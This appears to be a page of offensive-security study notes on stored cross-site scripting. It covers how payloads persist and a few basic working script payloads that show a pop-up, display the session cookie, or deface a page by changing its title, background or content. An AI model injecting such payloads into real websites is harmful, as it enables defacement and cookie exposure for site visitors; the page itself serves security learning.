# Stored XSS

Stored XSS is persistent, and most critical. It happens when our malicious XSS payload gets stored in the back-end after injecting on the client-side and gets retrieved when visiting the page. May affect any user that visits the page (persistent). It is also difficult to remove as stored on back-end.

To know if the exploited payload was Stored XSS, we can refresh the page to see if it executes again. This is not unique to us, and will trigger to any user that visits the page **(confirm through** page-source **)**.

Common payloads

Copy

```
<script>alert(window.origin)</script> # Displays a pop-up window
<script>alert(document.cookie)</script> # Displays the current session cookie
```

### [Direct link to heading](stored-xss.md#defacing) Defacing

We can use simple HTML elements (can use advanced too but not necessary) to change the look of the website.

Change page title

Copy

```
<script>document.title = "Hacked!"</script>
```

Text replacement

Copy

```
<script>document.getElementById("todo").innerHTML = "This page has been compromised."</script>
```

Change background

Copy

```
<script>document.body.style.backgroundColor = "red"</script>
```

Common approach is to overwrite everything with a message using innerHTML. Here we select the first body element (\[0]).

Copy

```
document.getElementsByTagName('body')[0].innerHTML = "This site has been defaced."
```

[PreviousXSS](security/offensive-security/web-applications/web-exploitation/xss/) [NextReflected XSS](security/offensive-security/web-applications/web-exploitation/xss/reflected-xss.md)

Last updated 4 days ago
